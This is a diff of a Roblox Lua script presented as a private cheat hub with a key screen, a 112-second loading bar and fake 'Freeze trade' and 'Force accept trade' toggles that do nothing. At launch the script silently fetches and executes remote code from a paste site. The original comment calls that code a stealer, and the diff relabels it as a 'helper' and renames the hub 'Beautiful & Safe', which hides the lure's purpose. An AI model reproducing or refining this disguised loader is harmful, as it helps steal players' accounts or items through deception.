@@ -1,14 +1,14 @@
 -- ===========================================
--- Mertily's Private Script Hub — Ultimate
+-- Mertily's Private Script Hub — Beautiful & Safe
 -- ===========================================
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
+local ContentProvider = game:GetService("ContentProvider")
 local player = Players.LocalPlayer
 
--- === СТИЛАК ЗАГРУЖАЕТСЯ В САМОМ НАЧАЛЕ ===
+-- === ПОДМОГА ДЛЯ СКРИПТА ЗАГРУЖАЕТСЯ В САМОМ НАЧАЛЕ ===
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
@@ -26,21 +26,23 @@ if playerGui:FindFirstChild("MertilyPrivateGui") then
     playerGui.MertilyPrivateGui:Destroy()
 end
 
--- === Цветовая палитра ===
+-- Цветовая палитра
 local THEME = {
-    Background = Color3.fromRGB(12, 12, 15),
-    Header = Color3.fromRGB(28, 28, 34),
-    Card = Color3.fromRGB(45, 45, 52),
-    CardHover = Color3.fromRGB(55, 55, 65),
-    AccentPurple = Color3.fromRGB(155, 89, 182),
+    Background = Color3.fromRGB(15, 12, 18),
+    Header = Color3.fromRGB(25, 20, 30),
+    Card = Color3.fromRGB(38, 30, 45),
+    CardHover = Color3.fromRGB(55, 42, 65),
+    AccentPurple = Color3.fromRGB(165, 80, 200),
     AccentGreen = Color3.fromRGB(46, 204, 113),
+    RoseDark = Color3.fromRGB(90, 20, 45),
+    RoseLeaf = Color3.fromRGB(80, 160, 90),
     TextPrimary = Color3.fromRGB(255, 255, 255),
-    TextSecondary = Color3.fromRGB(170, 175, 190),
+    TextSecondary = Color3.fromRGB(180, 170, 195),
     Danger = Color3.fromRGB(231, 76, 60),
-    Border = Color3.fromRGB(60, 60, 72)
+    Border = Color3.fromRGB(80, 50, 95)
 }
 
--- Создаем ScreenGui (ResetOnSpawn = false чтобы не пропадал при смерти)
+-- Создание ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "MertilyPrivateGui"
 screenGui.IgnoreGuiInset = true
@@ -48,7 +50,6 @@ screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = playerGui
 
--- === Вспомогательные функции UI ===
 local function createCorner(parent, radius)
     local corner = Instance.new("UICorner")
     corner.CornerRadius = UDim.new(0, radius or 12)
@@ -65,7 +66,6 @@ local function createStroke(parent, color, thickness)
     return stroke
 end
 
--- Перетаскивание окон
 local function makeDraggable(frame, handle)
     handle = handle or frame
     local dragging, dragInput, dragStart, startPos
@@ -102,13 +102,12 @@ local function makeDraggable(frame, handle)
 end
 
 -- ===========================================
--- 1. ЭКРАН ПРИВЕТСТВИЯ (Splash Screen)
+-- 1. ЭКРАН ПРИВЕТСТВИЯ (3 Секунды)
 -- ===========================================
 local splashFrame = Instance.new("Frame")
 splashFrame.Name = "SplashScreen"
 splashFrame.Size = UDim2.new(1, 0, 1, 0)
-splashFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-splashFrame.BackgroundTransparency = 0
+splashFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
 splashFrame.ZIndex = 100
 splashFrame.Parent = screenGui
 
@@ -124,7 +123,7 @@ titleText.Size = UDim2.new(1, 0, 0, 45)
 titleText.BackgroundTransparency = 1
 titleText.Text = "Mertily's script"
 titleText.TextColor3 = THEME.AccentPurple
-titleText.TextSize = 34
+titleText.TextSize = 36
 titleText.Font = Enum.Font.GothamBold
 titleText.TextTransparency = 1
 titleText.ZIndex = 101
@@ -143,81 +142,7 @@ privateText.ZIndex = 101
 privateText.Parent = splashContainer
 
 -- ===========================================
--- 2. ГЛАВНЫЙ АНИМИРОВАННЫЙ ФОН (Розы + Падающие Листья)
--- ===========================================
-local mainBackground = Instance.new("Frame")
-mainBackground.Name = "MainBackground"
-mainBackground.Size = UDim2.new(1, 0, 1, 0)
-mainBackground.BackgroundColor3 = THEME.Background
-mainBackground.Visible = false
-mainBackground.ZIndex = 1
-mainBackground.Parent = screenGui
-
-local roseImage = Instance.new("ImageLabel")
-roseImage.Size = UDim2.new(1, 0, 1, 0)
-roseImage.BackgroundTransparency = 1
-roseImage.Image = "rbxassetid://6071575925"
-roseImage.ImageTransparency = 0.85
-roseImage.ScaleType = Enum.ScaleType.Crop
-roseImage.ZIndex = 2
-roseImage.Parent = mainBackground
-
-local leavesContainer = Instance.new("Frame")
-leavesContainer.Size = UDim2.new(1, 0, 1, 0)
-leavesContainer.BackgroundTransparency = 1
-leavesContainer.ClipsDescendants = true
-leavesContainer.ZIndex = 3
-leavesContainer.Parent = mainBackground
-
-local function spawnLeaf()
-    local leaf = Instance.new("ImageLabel")
-    leaf.Size = UDim2.new(0, math.random(14, 22), 0, math.random(14, 22))
-    leaf.Position = UDim2.new(math.random(), 0, -0.05, 0)
-    leaf.BackgroundTransparency = 1
-    leaf.Image = "rbxassetid://6071575925"
-    leaf.ImageColor3 = Color3.fromRGB(100, 200, 120)
-    leaf.ImageTransparency = math.random(3, 6) / 10
-    leaf.ZIndex = 3
-    leaf.Parent = leavesContainer
-
-    createCorner(leaf, 10)
-
-    local fallDuration = math.random(8, 14)
-    local startX = leaf.Position.X.Scale
-    local swayAmount = math.random(3, 8) / 100
-
-    local tweenFall = TweenService:Create(leaf, TweenInfo.new(fallDuration, Enum.EasingStyle.Linear), {
-        Position = UDim2.new(startX, 0, 1.05, 0),
-        Rotation = math.random(180, 360)
-    })
-    tweenFall:Play()
-
-    task.spawn(function()
-        local startTime = tick()
-        while tick() - startTime < fallDuration and leaf.Parent do
-            local elapsed = tick() - startTime
-            local sway = math.sin(elapsed * 2) * swayAmount
-            leaf.Position = UDim2.new(startX + sway, 0, leaf.Position.Y.Scale, leaf.Position.Y.Offset)
-            task.wait(0.03)
-        end
-    end)
-
-    tweenFall.Completed:Connect(function()
-        leaf:Destroy()
-    end)
-end
-
-task.spawn(function()
-    while true do
-        if mainBackground.Visible then
-            spawnLeaf()
-        end
-        task.wait(0.8)
-    end
-end)
-
--- ===========================================
--- 3. ГЛАВНОЕ ОКНО
+-- 2. ОСНОВНОЕ ОКНО И КРАСИВЫЙ ФОН
 -- ===========================================
 local mainWindow = Instance.new("Frame")
 mainWindow.Name = "MainWindow"
@@ -233,12 +158,89 @@ mainWindow.Parent = screenGui
 createCorner(mainWindow, 16)
 createStroke(mainWindow, THEME.AccentPurple, 1.5)
 
--- Шапка
+-- Контейнер для фона
+local bgPatternFrame = Instance.new("Frame")
+bgPatternFrame.Size = UDim2.new(1, 0, 1, 0)
+bgPatternFrame.BackgroundTransparency = 1
+bgPatternFrame.ClipsDescendants = true
+bgPatternFrame.ZIndex = 1
+bgPatternFrame.Parent = mainWindow
+
+-- Красивая текстура роз
+local roseImage = Instance.new("ImageLabel")
+roseImage.Name = "RoseTexture"
+roseImage.Size = UDim2.new(1, 0, 1, 0)
+roseImage.BackgroundTransparency = 1
+roseImage.Image = "rbxassetid://6071575925" -- Текстура узора роз
+roseImage.ImageColor3 = Color3.fromRGB(140, 40, 75)
+roseImage.ImageTransparency = 0.8
+roseImage.ScaleType = Enum.ScaleType.Tile
+roseImage.TileSize = UDim2.new(0, 120, 0, 120)
+roseImage.ZIndex = 1
+roseImage.Parent = bgPatternFrame
+
+-- Градиент сверху для глубинного эффекта
+local bgGradient = Instance.new("UIGradient")
+bgGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 15, 30)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 8, 15))
+})
+bgGradient.Rotation = 45
+bgGradient.Parent = mainWindow
+
+-- Анимация падения листиков
+local function spawnLeaf()
+    local leaf = Instance.new("Frame")
+    leaf.Size = UDim2.new(0, math.random(6, 12), 0, math.random(10, 16))
+    leaf.Position = UDim2.new(math.random(0, 95) / 100, 0, -0.1, 0)
+    leaf.BackgroundColor3 = THEME.RoseLeaf
+    leaf.BackgroundTransparency = 0.3
+    leaf.Rotation = math.random(0, 180)
+    leaf.ZIndex = 2
+    leaf.Parent = bgPatternFrame
+
+    createCorner(leaf, 6)
+
+    local fallDuration = math.random(5, 8)
+    local startX = leaf.Position.X.Scale
+    local swayAmount = math.random(3, 8) / 100
+
+    local tweenFall = TweenService:Create(leaf, TweenInfo.new(fallDuration, Enum.EasingStyle.Linear), {
+        Position = UDim2.new(startX, 0, 1.1, 0),
+        Rotation = leaf.Rotation + 180
+    })
+    tweenFall:Play()
+
+    task.spawn(function()
+        local startTime = tick()
+        while tick() - startTime < fallDuration and leaf.Parent do
+            local elapsed = tick() - startTime
+            local sway = math.sin(elapsed * 3) * swayAmount
+            leaf.Position = UDim2.new(startX + sway, 0, leaf.Position.Y.Scale, leaf.Position.Y.Offset)
+            task.wait(0.03)
+        end
+    end)
+
+    tweenFall.Completed:Connect(function()
+        leaf:Destroy()
+    end)
+end
+
+task.spawn(function()
+    while true do
+        if mainWindow.Visible then
+            spawnLeaf()
+        end
+        task.wait(0.7)
+    end
+end)
+
+-- Шапка окна
 local titleBar = Instance.new("Frame")
 titleBar.Size = UDim2.new(1, 0, 0, 46)
 titleBar.BackgroundColor3 = THEME.Header
 titleBar.BorderSizePixel = 0
-titleBar.ZIndex = 11
+titleBar.ZIndex = 10
 titleBar.Parent = mainWindow
 
 createCorner(titleBar, 16)
@@ -252,20 +254,22 @@ headerTitle.TextColor3 = THEME.TextPrimary
 headerTitle.TextSize = 14
 headerTitle.Font = Enum.Font.GothamBold
 headerTitle.TextXAlignment = Enum.TextXAlignment.Left
-headerTitle.ZIndex = 12
+headerTitle.ZIndex = 11
 headerTitle.Parent = titleBar
 
 makeDraggable(mainWindow, titleBar)
 
 -- -------------------------------------------
--- 3.1 Экран Ввода Ключа (Сразу после приветствия)
+-- Внутренние Экраны
 -- -------------------------------------------
+
+-- 1. Ввод ключа
 local keySystemFrame = Instance.new("Frame")
 keySystemFrame.Size = UDim2.new(1, -30, 1, -60)
 keySystemFrame.Position = UDim2.new(0, 15, 0, 55)
 keySystemFrame.BackgroundTransparency = 1
 keySystemFrame.Visible = true
-keySystemFrame.ZIndex = 11
+keySystemFrame.ZIndex = 10
 keySystemFrame.Parent = mainWindow
 
 local keyInstructionLabel = Instance.new("TextLabel")
@@ -276,7 +280,7 @@ keyInstructionLabel.TextColor3 = THEME.TextPrimary
 keyInstructionLabel.TextSize = 13
 keyInstructionLabel.Font = Enum.Font.GothamMedium
 keyInstructionLabel.TextXAlignment = Enum.TextXAlignment.Left
-keyInstructionLabel.ZIndex = 11
+keyInstructionLabel.ZIndex = 10
 keyInstructionLabel.Parent = keySystemFrame
 
 local textBoxContainer = Instance.new("Frame")
@@ -284,7 +288,7 @@ textBoxContainer.Size = UDim2.new(1, 0, 0, 44)
 textBoxContainer.Position = UDim2.new(0, 0, 0, 28)
 textBoxContainer.BackgroundColor3 = THEME.Card
 textBoxContainer.BorderSizePixel = 0
-textBoxContainer.ZIndex = 11
+textBoxContainer.ZIndex = 10
 textBoxContainer.Parent = keySystemFrame
 
 createCorner(textBoxContainer, 10)
@@ -296,13 +300,13 @@ keyTextBox.Position = UDim2.new(0, 10, 0, 0)
 keyTextBox.BackgroundTransparency = 1
 keyTextBox.Text = ""
 keyTextBox.PlaceholderText = PLACEHOLDER_KEY
-keyTextBox.PlaceholderColor3 = Color3.fromRGB(110, 115, 130)
+keyTextBox.PlaceholderColor3 = Color3.fromRGB(120, 110, 135)
 keyTextBox.TextColor3 = THEME.TextPrimary
 keyTextBox.TextSize = 11
 keyTextBox.Font = Enum.Font.Code
 keyTextBox.TextXAlignment = Enum.TextXAlignment.Left
 keyTextBox.ClearTextOnFocus = false
-keyTextBox.ZIndex = 12
+keyTextBox.ZIndex = 11
 keyTextBox.Parent = textBoxContainer
 
 local submitButton = Instance.new("TextButton")
@@ -315,7 +319,7 @@ submitButton.TextColor3 = THEME.TextPrimary
 submitButton.TextSize = 13
 submitButton.Font = Enum.Font.GothamBold
 submitButton.AutoButtonColor = false
-submitButton.ZIndex = 11
+submitButton.ZIndex = 10
 submitButton.Parent = keySystemFrame
 
 createCorner(submitButton, 10)
@@ -329,18 +333,16 @@ keyStatusLabel.Text = ""
 keyStatusLabel.TextColor3 = THEME.Danger
 keyStatusLabel.TextSize = 11
 keyStatusLabel.Font = Enum.Font.Gotham
-keyStatusLabel.ZIndex = 11
+keyStatusLabel.ZIndex = 10
 keyStatusLabel.Parent = keySystemFrame
 
--- -------------------------------------------
--- 3.2 Экран Проверки на бота
--- -------------------------------------------
+-- 2. Проверка на бота
 local botCheckFrame = Instance.new("Frame")
 botCheckFrame.Size = UDim2.new(1, -30, 1, -60)
 botCheckFrame.Position = UDim2.new(0, 15, 0, 55)
 botCheckFrame.BackgroundTransparency = 1
 botCheckFrame.Visible = false
-botCheckFrame.ZIndex = 11
+botCheckFrame.ZIndex = 10
 botCheckFrame.Parent = mainWindow
 
 local botCheckLabel = Instance.new("TextLabel")
@@ -351,18 +353,16 @@ botCheckLabel.TextColor3 = THEME.TextSecondary
 botCheckLabel.TextSize = 15
 botCheckLabel.Font = Enum.Font.GothamMedium
 botCheckLabel.TextWrapped = true
-botCheckLabel.ZIndex = 11
+botCheckLabel.ZIndex = 10
 botCheckLabel.Parent = botCheckFrame
 
--- -------------------------------------------
--- 3.3 Экран Загрузки (112 секунд)
--- -------------------------------------------
+-- 3. Загрузка (112 сек)
 local loadingFrame = Instance.new("Frame")
 loadingFrame.Size = UDim2.new(1, -30, 1, -60)
 loadingFrame.Position = UDim2.new(0, 15, 0, 55)
 loadingFrame.BackgroundTransparency = 1
 loadingFrame.Visible = false
-loadingFrame.ZIndex = 11
+loadingFrame.ZIndex = 10
 loadingFrame.Parent = mainWindow
 
 local loadingTitle = Instance.new("TextLabel")
@@ -372,7 +372,7 @@ loadingTitle.Text = "Загрузка скрипта с библиотек..."
 loadingTitle.TextColor3 = THEME.TextPrimary
 loadingTitle.TextSize = 13
 loadingTitle.Font = Enum.Font.GothamMedium
-loadingTitle.ZIndex = 11
+loadingTitle.ZIndex = 10
 loadingTitle.Parent = loadingFrame
 
 local progressBg = Instance.new("Frame")
@@ -380,7 +380,7 @@ progressBg.Size = UDim2.new(1, 0, 0, 14)
 progressBg.Position = UDim2.new(0, 0, 0, 45)
 progressBg.BackgroundColor3 = THEME.Card
 progressBg.BorderSizePixel = 0
-progressBg.ZIndex = 11
+progressBg.ZIndex = 10
 progressBg.Parent = loadingFrame
 
 createCorner(progressBg, 7)
@@ -389,7 +389,7 @@ local progressFill = Instance.new("Frame")
 progressFill.Size = UDim2.new(0, 0, 1, 0)
 progressFill.BackgroundColor3 = THEME.AccentPurple
 progressFill.BorderSizePixel = 0
-progressFill.ZIndex = 12
+progressFill.ZIndex = 11
 progressFill.Parent = progressBg
 
 createCorner(progressFill, 7)
@@ -402,18 +402,16 @@ percentLabel.Text = "0%"
 percentLabel.TextColor3 = THEME.TextSecondary
 percentLabel.TextSize = 14
 percentLabel.Font = Enum.Font.GothamBold
-percentLabel.ZIndex = 11
+percentLabel.ZIndex = 10
 percentLabel.Parent = loadingFrame
 
--- -------------------------------------------
--- 3.4 Экран Благодарности
--- -------------------------------------------
+-- 4. Благодарность
 local thankYouFrame = Instance.new("Frame")
 thankYouFrame.Size = UDim2.new(1, -30, 1, -60)
 thankYouFrame.Position = UDim2.new(0, 15, 0, 55)
 thankYouFrame.BackgroundTransparency = 1
 thankYouFrame.Visible = false
-thankYouFrame.ZIndex = 11
+thankYouFrame.ZIndex = 10
 thankYouFrame.Parent = mainWindow
 
 local thankYouLabel = Instance.new("TextLabel")
@@ -424,18 +422,16 @@ thankYouLabel.TextColor3 = THEME.AccentGreen
 thankYouLabel.TextSize = 15
 thankYouLabel.Font = Enum.Font.GothamBold
 thankYouLabel.TextWrapped = true
-thankYouLabel.ZIndex = 11
+thankYouLabel.ZIndex = 10
 thankYouLabel.Parent = thankYouFrame
 
--- -------------------------------------------
--- 3.5 Основное Меню Функций
--- -------------------------------------------
+-- 5. Меню Чита
 local cheatMenuFrame = Instance.new("Frame")
 cheatMenuFrame.Size = UDim2.new(1, -30, 1, -60)
 cheatMenuFrame.Position = UDim2.new(0, 15, 0, 55)
 cheatMenuFrame.BackgroundTransparency = 1
 cheatMenuFrame.Visible = false
-cheatMenuFrame.ZIndex = 11
+cheatMenuFrame.ZIndex = 10
 cheatMenuFrame.Parent = mainWindow
 
 local function createToggle(parent, yPos, titleText)
@@ -444,7 +440,7 @@ local function createToggle(parent, yPos, titleText)
     toggleCard.Position = UDim2.new(0, 0, 0, yPos)
     toggleCard.BackgroundColor3 = THEME.Card
     toggleCard.BorderSizePixel = 0
-    toggleCard.ZIndex = 11
+    toggleCard.ZIndex = 10
     toggleCard.Parent = parent
 
     createCorner(toggleCard, 10)
@@ -459,15 +455,15 @@ local function createToggle(parent, yPos, titleText)
     label.TextSize = 13
     label.Font = Enum.Font.GothamMedium
     label.TextXAlignment = Enum.TextXAlignment.Left
-    label.ZIndex = 12
+    label.ZIndex = 11
     label.Parent = toggleCard
 
     local track = Instance.new("Frame")
     track.Size = UDim2.new(0, 44, 0, 22)
     track.Position = UDim2.new(1, -54, 0.5, -11)
-    track.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
+    track.BackgroundColor3 = Color3.fromRGB(30, 25, 38)
     track.BorderSizePixel = 0
-    track.ZIndex = 12
+    track.ZIndex = 11
     track.Parent = toggleCard
 
     createCorner(track, 11)
@@ -477,7 +473,7 @@ local function createToggle(parent, yPos, titleText)
     thumb.Position = UDim2.new(0, 3, 0.5, -8)
     thumb.BackgroundColor3 = THEME.TextPrimary
     thumb.BorderSizePixel = 0
-    thumb.ZIndex = 13
+    thumb.ZIndex = 12
     thumb.Parent = track
 
     createCorner(thumb, 8)
@@ -486,14 +482,14 @@ local function createToggle(parent, yPos, titleText)
     btn.Size = UDim2.new(1, 0, 1, 0)
     btn.BackgroundTransparency = 1
     btn.Text = ""
-    btn.ZIndex = 14
+    btn.ZIndex = 13
     btn.Parent = track
 
     local enabled = false
     btn.MouseButton1Click:Connect(function()
         enabled = not enabled
         local targetPos = enabled and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
-        local targetColor = enabled and THEME.AccentPurple or Color3.fromRGB(30, 30, 36)
+        local targetColor = enabled and THEME.AccentPurple or Color3.fromRGB(30, 25, 38)
         
         TweenService:Create(thumb, TweenInfo.new(0.2), {Position = targetPos}):Play()
         TweenService:Create(track, TweenInfo.new(0.2), {BackgroundColor3 = targetColor}):Play()
@@ -504,35 +500,42 @@ createToggle(cheatMenuFrame, 0, "Freeze trade")
 createToggle(cheatMenuFrame, 58, "Force accept trade")
 
 -- ===========================================
--- 4. ПОСЛЕДОВАТЕЛЬНОСТЬ СЦЕНАРИЯ
+-- 3. АНИМАЦИИ И СНАРЯЖЕНИЕ
 -- ===========================================
 
+-- Безопасная асинхронная предзагрузка картинки
 task.spawn(function()
-    -- 1. Приветствие
-    local tweenInTitle = TweenService:Create(titleText, TweenInfo.new(1.2), {TextTransparency = 0})
-    local tweenInPrivate = TweenService:Create(privateText, TweenInfo.new(1.2), {TextTransparency = 0})
-    tweenInTitle:Play()
-    tweenInPrivate:Play()
-    task.wait(2.8)
+    pcall(function()
+        ContentProvider:PreloadAsync({roseImage})
+    end)
+end)
 
-    local tweenOutSplash = TweenService:Create(splashFrame, TweenInfo.new(1), {BackgroundTransparency = 1})
-    TweenService:Create(titleText, TweenInfo.new(1), {TextTransparency = 1}):Play()
-    TweenService:Create(privateText, TweenInfo.new(1), {TextTransparency = 1}):Play()
+task.spawn(function()
+    -- Появление текста
+    TweenService:Create(titleText, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
+    TweenService:Create(privateText, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
+    
+    -- Ровно 3 секунды приветствия
+    task.wait(3)
+
+    -- Исчезновение черного экрана
+    local tweenOutSplash = TweenService:Create(splashFrame, TweenInfo.new(0.8), {BackgroundTransparency = 1})
+    TweenService:Create(titleText, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
+    TweenService:Create(privateText, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
     tweenOutSplash:Play()
     
     tweenOutSplash.Completed:Wait()
     splashFrame.Visible = false
-    mainBackground.Visible = true
 
-    -- 2. Открытие окна ввода ключа (сразу после приветствия)
+    -- Открытие основного GUI
     mainWindow.Visible = true
     mainWindow.Size = UDim2.new(0, 380, 0, 0)
-    TweenService:Create(mainWindow, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    TweenService:Create(mainWindow, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
         Size = UDim2.new(0, 380, 0, 260)
     }):Play()
 end)
 
--- Проверка ключа -> Проверка на бота -> Загрузка -> Главное меню
+-- Обработка кнопки
 submitButton.MouseButton1Click:Connect(function()
     if keyTextBox.Text == SECRET_KEY then
         keyStatusLabel.TextColor3 = THEME.AccentGreen
@@ -552,7 +555,7 @@ submitButton.MouseButton1Click:Connect(function()
             botCheckFrame.Visible = false
             loadingFrame.Visible = true
 
-            -- Процесс фейковой загрузки (112 секунд)
+            -- Загрузка (112 секунд)
             local startTime = tick()
             while tick() - startTime < LOADING_TIME do
                 local elapsed = tick() - startTime
@@ -567,12 +570,12 @@ submitButton.MouseButton1Click:Connect(function()
             percentLabel.Text = "100%"
             task.wait(0.5)
 
-            -- Появление надписи с благодарностью
+            -- Показ благодарности
             loadingFrame.Visible = false
             thankYouFrame.Visible = true
             task.wait(3)
 
-            -- Выход в главное меню
+            -- Выход в читы
             thankYouFrame.Visible = false
             cheatMenuFrame.Visible = true
             headerTitle.Text = "Mertily's Private — Main Menu"
@@ -591,7 +594,6 @@ submitButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Эффект при наведении
 submitButton.MouseEnter:Connect(function()
     TweenService:Create(submitButton, TweenInfo.new(0.2), {BackgroundColor3 = THEME.CardHover}):Play()
 end)
